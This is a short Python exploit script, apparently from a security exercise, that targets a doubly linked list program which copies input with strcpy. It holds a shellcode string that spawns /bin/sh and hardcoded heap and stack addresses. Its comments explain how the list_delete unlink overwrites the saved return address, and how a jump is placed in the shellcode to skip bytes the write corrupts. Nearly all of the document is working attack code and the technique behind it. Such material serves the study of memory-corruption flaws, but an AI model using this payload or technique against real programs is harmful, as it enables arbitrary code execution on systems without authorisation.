from struct import pack

shellcode = ("\xeb\x06\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

shellcode_addr_in_heap = 0x080F3750
return_addr_in_main = 0xbffed1dc
# shellcode_addr_in_heap = 
ebp = 0xbffed1d8

nodeA = 'A'*40
nodeB = shellcode + 'B'*9 + pack("<I", shellcode_addr_in_heap) + pack("<I", return_addr_in_main)
nodeC = 'C'
space = ' '

print nodeA + space + nodeB + space + nodeC
# print "AAAA" + " " + "BBBB" + " " + "CCCC"


'''

Vulnerability: 
The Doubly Linked list uses strcpy for accepting its data items.

  a   |    b    |   c
---------------------------
      |	 Gamma	 | Alpha		
      |	 Pi	 | Beta        
---------------------------
      | shellcode|  'C'     
A * 40|    +     |
      | 'B' * 9  |
---------------------------

Exploit:When the pointers are assigned in the list_delete function,
the following assignments happen:

Alpha + 4 <-- Beta
Beta <-- Alpha

Gamma + 4 <-- Pi
Pi <-- Gamme

Gamma <-- 0

Idea: We will only touch Alpha and Beta. Lets keep Alpha as Address of place in heap where we put shellcode) and Beta as the Address of the stacks where we should put this address,ebp+4. Then the address of the shellcode will go inside the stack where the code will return to after list_delete(a).

But the Alpha + 4, which is 2nd instruction of the shellcode gets modified as well. So, we need to rewrite shellcode to put a jump to 3rd instruction in the first instruction followed by NOPs.

'''



